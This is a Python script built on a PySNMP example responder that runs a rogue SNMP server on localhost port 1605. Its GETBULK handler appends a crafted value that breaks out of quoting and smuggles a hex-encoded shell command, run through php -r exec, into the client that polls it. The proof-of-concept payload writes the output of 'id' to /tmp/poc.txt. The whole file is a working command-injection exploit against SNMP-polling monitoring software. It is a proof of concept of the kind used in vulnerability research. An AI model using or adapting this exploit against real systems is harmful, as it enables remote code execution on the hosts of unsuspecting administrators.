#!/usr/bin/python3

from pysnmp.carrier.asyncio.dispatch import AsyncioDispatcher
from pysnmp.carrier.asyncio.dgram import udp, udp6
from pyasn1.codec.ber import encoder, decoder
from pysnmp.proto import api, rfc1902
import time, bisect

payload_str = "id > /tmp/poc.txt"
payload = bytes(payload_str, encoding='utf8').hex()

class SysDescr:
    name = (1, 3, 6, 1, 2, 1, 1, 1, 0)

    def __eq__(self, other):
        return self.name == other

    def __ne__(self, other):
        return self.name != other

    def __lt__(self, other):
        return self.name < other

    def __le__(self, other):
        return self.name <= other

    def __gt__(self, other):
        return self.name > other

    def __ge__(self, other):
        return self.name >= other

    def __call__(self, protoVer):
        return api.PROTOCOL_MODULES[protoVer].OctetString(
            "PySNMP example command responder"
        )


class Names:
    name = (1, 3, 6, 1, 4, 1, 2021, 13, 15, 1, 1, 2)

    def __eq__(self, other):
        return self.name == other

    def __ne__(self, other):
        return self.name != other

    def __lt__(self, other):
        return self.name < other

    def __le__(self, other):
        return self.name <= other

    def __gt__(self, other):
        return self.name > other

    def __ge__(self, other):
        return self.name >= other

    def __call__(self, protoVer):
        return api.PROTOCOL_MODULES[protoVer].OctetString(
            "sdphantom"
        )

class Iops:
    name = (1, 3, 6, 1, 4, 1, 2021, 13, 15, 1, 1, 5)
    birthday = time.time()

    def __eq__(self, other):
        return self.name == other

    def __ne__(self, other):
        return self.name != other

    def __lt__(self, other):
        return self.name < other

    def __le__(self, other):
        return self.name <= other

    def __gt__(self, other):
        return self.name > other

    def __ge__(self, other):
        return self.name >= other

    def __call__(self, protoVer):
        return api.PROTOCOL_MODULES[protoVer].OctetString(
            "oi"
        )

mibInstr = (SysDescr(), Names(), Iops())  # sorted by object name

mibInstrIdx = {}
for mibVar in mibInstr:
    mibInstrIdx[mibVar.name] = mibVar


def cbFun(transportDispatcher, transportDomain, transportAddress, wholeMsg):
    while wholeMsg:
        msgVer = api.decodeMessageVersion(wholeMsg)
        if msgVer in api.PROTOCOL_MODULES:
            pMod = api.PROTOCOL_MODULES[msgVer]
        else:
            print("Unsupported SNMP version %s" % msgVer)
            return
        reqMsg, wholeMsg = decoder.decode(
            wholeMsg,
            asn1Spec=pMod.Message(),
        )
        rspMsg = pMod.apiMessage.get_response(reqMsg)
        rspPDU = pMod.apiMessage.get_pdu(rspMsg)
        reqPDU = pMod.apiMessage.get_pdu(reqMsg)
        varBinds = []
        pendingErrors = []
        errorIndex = 0
        # GETNEXT PDU
        if reqPDU.isSameTypeWith(pMod.GetNextRequestPDU()):
            # Produce response var-binds
            for oid, val in pMod.apiPDU.get_varbinds(reqPDU):
                errorIndex = errorIndex + 1
                # Search next OID to report
                nextIdx = bisect.bisect(mibInstr, oid)
                if nextIdx == len(mibInstr):
                    # Out of MIB
                    varBinds.append((oid, val))
                    pendingErrors.append((pMod.apiPDU.setEndOfMibError, errorIndex))
                else:
                    # Report value if OID is found
                    varBinds.append((mibInstr[nextIdx].name, mibInstr[nextIdx](msgVer)))
        elif reqPDU.isSameTypeWith(pMod.GetRequestPDU()):
            for oid, val in pMod.apiPDU.get_varbinds(reqPDU):
                if oid in mibInstrIdx:
                    varBinds.append((oid, mibInstrIdx[oid](msgVer)))
                else:
                    # No such instance
                    varBinds.append((oid, val))
                    pendingErrors.append(
                        (pMod.apiPDU.set_no_such_instance_error, errorIndex)
                    )
                    break
        elif reqPDU.isSameTypeWith(pMod.GetBulkRequestPDU()):
            for oid, val in pMod.apiPDU.get_varbinds(reqPDU):
                if oid in mibInstrIdx:
                    #print(type(oid))
                    varBinds.append((oid, mibInstrIdx[oid](msgVer)))
                else:
                    # No such instance
                    varBinds.append((oid, val))
                    pendingErrors.append(
                        (pMod.apiPDU.set_no_such_instance_error, errorIndex)
                    )
                    break
            varBinds.append(((1, 3, 6, 1, 4, 1, 2021, 13, 15, 1, 1, 5, 2), 
                 api.PROTOCOL_MODULES[msgVer].OctetString(
                            "oi\r\n'; php -r 'exec(hex2bin(`echo -n %s`));'; #" % ((payload))
                 )
            ))
        else:
            # Report unsupported request type
            pMod.apiPDU.set_error_status(rspPDU, "genErr")
        pMod.apiPDU.set_varbinds(rspPDU, varBinds)
        # Commit possible error indices to response PDU
        for f, i in pendingErrors:
            f(rspPDU, i)
        encodedresp = encoder.encode(rspMsg)
        #print(encodedresp)
        transportDispatcher.send_message(
            encodedresp, transportDomain, transportAddress
        )
    print('got connection')
    return wholeMsg


transportDispatcher = AsyncioDispatcher()
transportDispatcher.register_recv_callback(cbFun)

# UDP/IPv4
transportDispatcher.register_transport(
    udp.DOMAIN_NAME, udp.UdpAsyncioTransport().open_server_mode(("localhost", 1605))
)

# UDP/IPv6
transportDispatcher.register_transport(
    udp6.DOMAIN_NAME, udp6.Udp6AsyncioTransport().open_server_mode(("::1", 1605))
)

transportDispatcher.job_started(1)

try:
    # Dispatcher will never finish as job#1 never reaches zero
    transportDispatcher.run_dispatcher()
except KeyboardInterrupt:
    print("Terminating....")
    transportDispatcher.close_dispatcher()
except:
    transportDispatcher.close_dispatcher()
    raise
